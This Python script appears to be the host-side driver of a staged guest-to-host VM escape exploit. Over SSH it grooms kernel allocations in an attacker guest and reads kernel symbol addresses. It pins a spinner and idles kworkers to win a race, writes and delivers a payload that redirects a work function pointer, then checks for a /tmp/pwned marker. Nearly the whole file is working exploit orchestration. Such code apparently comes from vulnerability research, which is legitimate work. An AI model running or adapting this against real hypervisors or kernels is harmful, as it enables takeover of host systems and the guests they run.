#!/usr/bin/env python3
# r7_stage.py -- host-side (L1, root) staged driver for the r7 successor-slot protocol.
# Stages: setup | alloc | windows | spin_on | spin_off | demo | payload | tight | check | stat
import subprocess, sys, time, re, json, os, base64

L2 = "ubuntu@192.168.250.114"
KEY = "/home/ubuntu/.ssh/l2_key"
LOG = "/tmp/r7run_obs.log"
STATE = "/tmp/r7state.json"

def sh(c, to=120):
    return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=to)

def l2(c, to=120):
    return subprocess.run(["ssh", "-o", "ControlMaster=no", "-o", "ControlPath=none",
                           "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=8",
                           "-i", KEY, L2, c], capture_output=True, text=True, timeout=to,
                          stdin=subprocess.DEVNULL)

def ksym(n):
    for line in open("/proc/kallsyms"):
        p = line.split()
        if len(p) >= 3 and p[2] == n:
            return int(p[0], 16)
    return 0

def obs_lines():
    try: return open(LOG, errors="replace").read().splitlines()
    except FileNotFoundError: return []

def parse_echo(lines, sports):
    m = {}
    for ln in lines:
        mm = re.match(r"ECHO dopt=([0-9a-f]+) sport=(\d+) cpu=(\d+)", ln)
        if not mm: continue
        sp = int(mm.group(2))
        if sp in sports:
            m[sp] = (int(mm.group(1), 16), int(mm.group(3)))
    return m

def parse_wchk(lines, since):
    out = []
    for ln in lines[since:]:
        mm = re.match(r"WCHK work=([0-9a-f]+) cache=([0-9a-f]+) fmrel=([0-9a-f]+) idx=(\d+) cpu=(\d+) name=(\S+)", ln)
        if mm:
            out.append(dict(work=int(mm.group(1), 16), cache=int(mm.group(2), 16),
                            fmrel=int(mm.group(3), 16), idx=int(mm.group(4)),
                            cpu=int(mm.group(5)), name=mm.group(6)))
    return out

def parse_exec(lines, since):
    out = []
    for ln in lines[since:]:
        mm = re.match(r"EXEC work=([0-9a-f]+) func=([0-9a-f]+) cpu=(\d+)", ln)
        if mm:
            out.append(dict(work=int(mm.group(1), 16), func=int(mm.group(2), 16), cpu=int(mm.group(3))))
    return out

def save(st): json.dump(st, open(STATE, "w"), indent=1)
def load(): return json.load(open(STATE))

def l2_up(timeout=120):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            if l2("true", 6).returncode == 0: return True
        except Exception: pass
        time.sleep(2)
    return False

def setup():
    sh("virsh start l2-attacker >/dev/null 2>&1; virsh resume l2-attacker >/dev/null 2>&1")
    print("L2 up:", l2_up())
    print(sh("bash /opt/pwnescape/tools/setup_guest.sh 2>&1 | tail -3").stdout.strip())
    scp = sh("scp -o ControlMaster=no -o ControlPath=none -o StrictHostKeyChecking=no -i %s "
             "/opt/pwnescape/tools/guest_exploit.py /opt/pwnescape/tools/r7_guest.py %s:/tmp/" % (KEY, L2))
    print("guest scp:", scp.returncode, scp.stderr.strip()[:200])
    print("fast-solve marker _s0:", l2("grep -c _s0 /tmp/r7_guest.py").stdout.strip())
    sh("ss -K state syn-recv >/dev/null 2>&1")
    print("syn-recv:", sh("ss -tan state syn-recv | wc -l").stdout.strip())
    # exploit probe fixtures: failed-neighbour branch, aged
    print(sh("bash /opt/pwnescape/tools/r7_fixtures.sh 12 2>&1 | tail -2").stdout.strip())
    sh("pkill -9 -x bpftrace; rm -f %s" % LOG)
    sh("nohup bpftrace -B none /opt/pwnescape/tools/r7_obs.bt > %s 2>&1 & sleep 2.5" % LOG)
    print("obs:", " | ".join(open(LOG, errors="replace").read().splitlines()[:2])[:200])

def alloc(pairs, extra, vbase, ovbase, sbase, pn=0, pbase=0):
    if pn > 0:
        r0 = l2("sudo python3 /tmp/r7_guest.py prime %d %d" % (pn, pbase), 120)
        print(r0.stdout.strip(), r0.stderr.strip()[:200])
    r = l2("sudo python3 /tmp/r7_guest.py alloc %d %d %d %d %d" % (pairs, extra, vbase, ovbase, sbase), 120)
    print(r.stdout.strip(), r.stderr.strip()[:300])
    time.sleep(0.9)
    lines = obs_lines()
    smap = {}
    for i in range(pairs):
        smap[ovbase+i] = (0xA0000000+i, "ov")
        smap[vbase+i] = (0xB0000000+i, "v")
        if sbase > 0: smap[sbase+i] = (0xC0000000+i, "s")
    for i in range(extra):
        smap[vbase+100+i] = (0xD0000000+i, "v")
    for i in range(pn):
        smap[pbase+i] = (0xE0000000+i, "p")
    em = parse_echo(lines, set(smap))
    addr2sp = {}
    for sp, (a, cpu) in em.items():
        addr2sp.setdefault(a, sp)
    page_last = None
    for i in range(extra - 1, -1, -1):
        sp = vbase + 100 + i
        if sp in em:
            page_last = em[sp][0] & ~0xfff
            break
    cand = []
    for i in range(pairs):
        vsp = vbase+i; ovsp = ovbase+i
        if vsp not in em or ovsp not in em: continue
        O = em[vsp][0]; B = em[ovsp][0]
        X = O + 64
        ssp = addr2sp.get(X)
        okB = (B == O - 64)
        same = (page_last is not None and (O & ~0xfff) == page_last)
        print("pair %d ov=%d@%#x v=%d@%#x O+64=%s adjB=%s samepage=%s" %
              (i, ovsp, B, vsp, O, ("%d@%#x" % (ssp, X)) if ssp else "EMPTY", okB, same))
        if ssp is None: continue
        cand.append(dict(i=i, v=vsp, vseq=smap[vsp][0], ov=ovsp, ovseq=smap[ovsp][0],
                         s=ssp, sseq=smap[ssp][0], O=O, B=B, X=X, adjB=okB, samepage=same))
    cand.sort(key=lambda c: (not c["samepage"], -c["O"]))
    st = dict(pairs=pairs, extra=extra, vbase=vbase, ovbase=ovbase, sbase=sbase,
              pn=pn, pbase=pbase, page_last=page_last,
              echo={str(k): v[0] for k, v in em.items()}, cand=cand)
    save(st)
    print("ECHO=%d CANDIDATES=%d adjB=%d samepage=%d page_last=%s" % (
        len(em), len(cand), sum(1 for c in cand if c["adjB"]),
        sum(1 for c in cand if c["samepage"]), hex(page_last) if page_last else None))
    for c in cand[:10]:
        print("  cand v=%d s=%d ov=%d O=%#x X=%#x adjB=%s" % (c["v"], c["s"], c["ov"], c["O"], c["X"], c["adjB"]))
    return 0

def windows():
    st = load()
    args = ["%d:%d" % (c["v"], c["vseq"]) for c in st["cand"]]
    if not args: print("no candidates"); return 1
    r = l2("sudo python3 /opt/pwnescape/tools/r7_guest.py readmany " + " ".join(args), 180)
    print(r.stdout.strip())
    return 0

def spin(on):
    if on:
        pids = sh("ps -eLo pid,comm,psr | awk '$3==7 && $2 ~ /^kworker/ {print $1}'").stdout.split()
        for p in pids: sh("chrt -i -p 0 %s" % p)
        sp = sh("nohup nice -n 19 taskset -c 7 bash -c 'while :; do :; done' >/dev/null 2>&1 & echo $!").stdout.strip()
        open("/tmp/r7spinner.pid", "w").write(sp)
        print("kworkers idle:", len(pids), "spinner:", sp)
    else:
        try:
            pid = open("/tmp/r7spinner.pid").read().strip(); sh("kill %s 2>/dev/null" % pid)
        except Exception: pass
        pids = sh("ps -eLo pid,comm,psr | awk '$3==7 && $2 ~ /^kworker/ {print $1}'").stdout.split()
        for p in pids: sh("chrt -o -p 0 %s" % p)
        print("restored kworkers:", len(pids))

def observer_since(): return len(obs_lines())

def show_delta(since):
    lines = obs_lines()
    for ln in lines[since:]:
        if ln.startswith("ECHO"): print("  " + ln)
    w = parse_wchk(lines, since); e = parse_exec(lines, since)
    for x in w: print("  WCHK work=%#x idx=%d fmrel=%#x name=%s" % (x["work"], x["idx"], x["fmrel"], x["name"]))
    for x in e: print("  EXEC work=%#x func=%#x" % (x["work"], x["func"]))
    return w, e

def demo(i, gw):
    st = load(); c = st["cand"][i]
    t = observer_since()
    r = l2("sudo python3 /opt/pwnescape/tools/r7_guest.py duptight %d %d %d %d %d demo%d" % (c["v"], c["vseq"], c["s"], c["sseq"], gw, i), 120)
    print(r.stdout.strip())
    time.sleep(0.25)
    w, e = show_delta(t)
    print("  expect X=%#x Y=%#x" % (c["X"], c["O"]))
    return 0

def payload(mode, X, pwq, ph, func):
    hexs = sh("python3 /opt/pwnescape/tools/r7_payload.py %d %d %d %d" % (X, pwq, ph, func)).stdout.strip()
    path = "/tmp/r7_%s.hex" % mode
    open(path, "w").write(hexs)
    b = base64.b64encode(open(path, "rb").read()).decode()
    r = l2("echo %s | base64 -d > /tmp/r7_%s.hex; wc -c /tmp/r7_%s.hex" % (b, mode, mode))
    print("payload %s %s" % (path, r.stdout.strip()))
    return 0

def tight(i, gw, wire):
    st = load(); c = st["cand"][i]
    newov = 43000 + i
    t = observer_since()
    r = l2("sudo python3 /opt/pwnescape/tools/r7_guest.py tight %d %d %d %d %d %d 0x%x /tmp/r7_%s.hex" %
           (c["v"], c["vseq"], c["s"], c["sseq"], gw, newov, 0x70000000+i, wire,
            "dry" if wire == 0x6000 else "fire"), 120)
    print(r.stdout.strip())
    time.sleep(0.35)
    w, e = show_delta(t)
    print("  expect X=%#x Y=%#x newov=%d" % (c["X"], c["O"], newov))
    return 0

def check():
    print("pwned:", sh("cat /tmp/pwned 2>&1; ls -l /tmp/pwned 2>&1").stdout.strip())
    print(sh("dmesg | tail -6").stdout)

if __name__ == "__main__":
    cmd = sys.argv[1]
    if cmd == "setup": setup()
    elif cmd == "alloc": alloc(*map(int, sys.argv[2:9]))
    elif cmd == "windows": windows()
    elif cmd == "spin_on": spin(True)
    elif cmd == "spin_off": spin(False)
    elif cmd == "demo": demo(int(sys.argv[2]), int(sys.argv[3], 0))
    elif cmd == "payload": payload(sys.argv[2], int(sys.argv[3], 0), int(sys.argv[4], 0), int(sys.argv[5], 0), int(sys.argv[6], 0))
    elif cmd == "tight": tight(int(sys.argv[2]), int(sys.argv[3], 0), int(sys.argv[4], 0))
    elif cmd == "check": check()
    elif cmd == "stat": print(json.dumps(load(), indent=1)[:4000])
    else: print("unknown")
